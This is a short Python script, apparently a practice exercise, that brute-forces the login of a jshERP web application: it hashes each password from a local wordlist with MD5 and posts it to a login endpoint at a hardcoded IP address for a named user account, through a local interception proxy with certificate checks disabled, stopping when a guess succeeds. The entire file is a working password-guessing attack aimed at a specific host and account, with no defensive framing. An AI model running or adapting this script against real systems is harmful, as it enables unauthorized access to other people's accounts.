import requests,warnings,re
from requests.packages import urllib3
import hashlib
#关闭警告
urllib3.disable_warnings()
warnings.filterwarnings("ignore")


with open("D:\\python_study\\pachong\\1.txt",'r') as f:
     for i in f:
          passwd = i.strip()
          result = hashlib.md5(passwd.encode("utf-8")).hexdigest()
          headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36",
    "Accept": "application/json, text/plain, */*",
    "Content-Type": "application/json;charset=UTF-8",
    "Origin": "https://121.36.8.88",
    "Referer": "https://121.36.8.88/"
}
 
          proxies = {
            "https":"http://127.0.0.1:8080"
        }
          data = {
            "loginName":"jinshengnan",
            "password":result
        }
          response = requests.post(url="https://121.36.8.88/jshERP-boot/user/login",headers=headers,json=data,timeout=5,verify=False,proxies=proxies)
          if "error" in response.text:
            pass
          else:
            print(f"密码为{passwd}")
            break
